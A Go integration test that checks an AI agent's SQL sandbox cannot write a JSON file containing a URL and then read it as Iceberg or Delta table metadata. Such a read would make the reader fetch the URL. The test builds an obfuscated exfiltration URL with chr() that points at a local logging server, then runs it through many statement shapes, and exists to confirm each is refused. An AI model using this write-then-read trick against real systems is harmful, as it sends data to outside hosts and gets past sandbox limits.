//go:build integration

package agents_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/SandwichLabs/slaw/internal/agents"
	"github.com/SandwichLabs/slaw/internal/session"
	"github.com/SandwichLabs/slaw/internal/testsupport/icebergtest"
	"github.com/SandwichLabs/slaw/internal/workspace"
)

// The rule: the agent never reads table metadata it could have written. It
// writes a JSON file that names a URL (COPY to data/e.json is an ordinary
// export) and points iceberg_scan at it; the file would be read as Iceberg
// metadata and the URL fetched while EXPLAIN binds the statement. Both halves
// are refused, with the extensions loaded and a logging server listening: no
// request may arrive.
func TestAgentCannotWriteThenReadTableMetadata(t *testing.T) {
	ctx := context.Background()
	srv := icebergtest.NewLogServer(t, t.TempDir())

	ws := memWS(t)
	require.NoError(t, ws.AddConnection(workspace.ScopeLocal, workspace.ConnectionDef{Name: "tbl_delta", Type: "delta", Path: "data/sales"}))
	require.NoError(t, ws.AddConnection(workspace.ScopeLocal, workspace.ConnectionDef{Name: "tbl_ice", Type: "iceberg", Path: "data/ice"}))
	sess, issues, err := workspace.OpenSession(ctx, ws, nil, workspace.WithSessionOptions(session.WithExtensionDirectory(extDir(t))))
	require.NoError(t, err)
	require.Empty(t, issues)
	defer sess.Close()
	for _, ext := range []string{"delta", "avro", "iceberg"} {
		require.NoError(t, sess.InstallExtension(ctx, ext))
	}
	sess.Preflight(ctx, "tbl_delta")
	sess.Preflight(ctx, "tbl_ice")
	data := filepath.Join(ws.Root(), "data")
	require.NoError(t, os.MkdirAll(filepath.Join(data, "t", "metadata"), 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(data, "pt"), 0o755))

	// The URL is built with chr() so no literal URL is in the statement text.
	leak := strings.ReplaceAll(srv.URL, "/", "' || chr(47) || '") + "' || chr(47) || 'leak' || chr(47) || 'alice@example.com"
	for _, mode := range []agents.SandboxMode{agents.ModeReadOnly, agents.ModeReadWrite, agents.ModeFull} {
		h := agentOn(t, ws, sess, mode, false)
		e := filepath.Join(data, "e.json")
		// Whether the write is allowed depends on the tier; it must never matter.
		_ = sqlCall(h, fmt.Sprintf(`COPY (SELECT '%s' AS "manifest-list", '%s' AS location) TO '%s' (FORMAT json)`, leak, leak, e))
		if mode == agents.ModeFull {
			require.FileExists(t, e, "the attack's first half is an ordinary export and must have written the file")
		}
		for _, fn := range []string{"iceberg_scan", "iceberg_metadata", "iceberg_snapshots", "delta_scan"} {
			q := fmt.Sprintf("SELECT * FROM %s('%s')", fn, e)
			resp := sqlCall(h, q)
			require.NotNil(t, resp.Error, q)
			assert.Equal(t, agents.ErrPermission, resp.Error.Code, q+": "+resp.Error.Message)
		}
		// The write half: names and folders that read as table metadata, and the
		// option that chooses file names.
		for _, q := range []string{
			fmt.Sprintf(`COPY (SELECT '%s' AS location) TO '%s' (FORMAT json)`, leak, filepath.Join(data, "v1.metadata.json")),
			fmt.Sprintf(`COPY (SELECT '%s' AS location) TO '%s' (FORMAT json)`, leak, filepath.Join(data, "t", "metadata", "v1.json")),
			fmt.Sprintf(`COPY (SELECT '%s' AS location, 1 AS p) TO '%s' (FORMAT json, PARTITION_BY (p), FILENAME_PATTERN 'v1.metadata')`, leak, filepath.Join(data, "pt")),
		} {
			resp := sqlCall(h, q)
			require.NotNil(t, resp.Error, q)
		}
	}
	assert.Empty(t, srv.Requests(), "nothing may fetch a URL the agent wrote")

	// Every statement shape that holds a reader call is held to the same rule,
	// in the full tier: a reader inside CTAS, INSERT ... SELECT, COPY (query),
	// UPDATE and DELETE subqueries, macro and view bodies.
	full := agentOn(t, ws, sess, agents.ModeFull, false)
	e := filepath.Join(data, "e.json")
	require.FileExists(t, e)
	for _, q := range []string{
		"CREATE TABLE zz(id INTEGER, k VARCHAR)",
		"CREATE TABLE zz2(id INTEGER, k VARCHAR)",
	} {
		_ = sqlCall(full, q)
	}
	for _, fn := range []string{"iceberg_scan", "iceberg_metadata", "iceberg_snapshots", "delta_scan"} {
		src := fmt.Sprintf("SELECT * FROM %s('%s')", fn, e)
		sub := fmt.Sprintf("(SELECT count(*) FROM %s('%s'))", fn, e)
		for _, q := range []string{
			"CREATE TABLE zz_ctas AS " + src,
			"CREATE TEMP TABLE zz_tmp AS " + src,
			"INSERT INTO zz " + src,
			"INSERT INTO zz SELECT 1, 'a' WHERE " + sub + " > 0",
			fmt.Sprintf("COPY (%s) TO '%s'", src, filepath.Join(data, "out.csv")),
			"UPDATE zz SET id = " + sub,
			"UPDATE zz SET id = 1 WHERE id IN (SELECT 1 FROM " + fn + "('" + e + "'))",
			"DELETE FROM zz WHERE id IN (SELECT 1 FROM " + fn + "('" + e + "'))",
			"DELETE FROM zz WHERE id = " + sub,
			"CREATE VIEW zz_v AS " + src,
			"CREATE MACRO zz_m() AS TABLE " + src,
			"CREATE MACRO zz_s() AS " + sub,
			"WITH c AS (" + src + ") SELECT * FROM c",
			"SELECT * FROM zz WHERE id IN (SELECT 1 FROM " + fn + "('" + e + "'))",
			"EXPLAIN " + src,
		} {
			resp := sqlCall(full, q)
			require.NotNil(t, resp.Error, q)
			assert.Equal(t, agents.ErrPermission, resp.Error.Code, q+": "+resp.Error.Message)
		}
	}
	assert.Empty(t, srv.Requests(), "no statement shape may fetch a URL the agent wrote")
}
